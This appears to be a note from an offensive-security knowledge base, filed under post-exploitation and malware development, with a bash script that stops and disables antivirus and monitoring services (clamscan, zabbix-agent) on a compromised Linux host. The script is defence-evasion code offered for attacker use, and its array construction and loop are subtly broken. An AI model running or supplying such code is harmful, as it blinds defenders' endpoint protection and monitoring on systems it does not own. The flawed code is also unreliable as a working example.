# Disable Daemon Services

## Scripting

### Bash

We'll need to check the program if it exists or not.

![[Enumerate Software#^0f142f]]

Then check if the service is enabled then it'll be disabled.

![[06 - Tactics & Techniques & Procedures Phases/F - Post Exploitation/0x00 - Discovery/Desktop/Linux/Host/0xD - Services/Malware Development/Enumerate Services#^ffa667]]

Then write the logic to disable the script. Then we fill in the array related to this section [[Disable Security Endpoints|disable security endpoints]].

```bash
function disable_service() {
    local service="${1}"

    fin "Disabling service..."
    if [[ -n $(check_program "systemctl") ]]
    then
	    systemctl disable "${service}.service"
        systemctl stop "${service}.service"
    elif [[ -n $(check_program "rc-service") ]]
    then
        rc-update del "${service}" default
        rc-service "${service}" stop
    fi
}

function main() {
	local -a services=$("clamscan" "zabbix-agent" "zabbix-agent2")
	
	for service in services
	do
		check_service "${service}"
		if ((${?} == 0))
		then
			disable_service "${service}"
		fi
	done
}

main
```

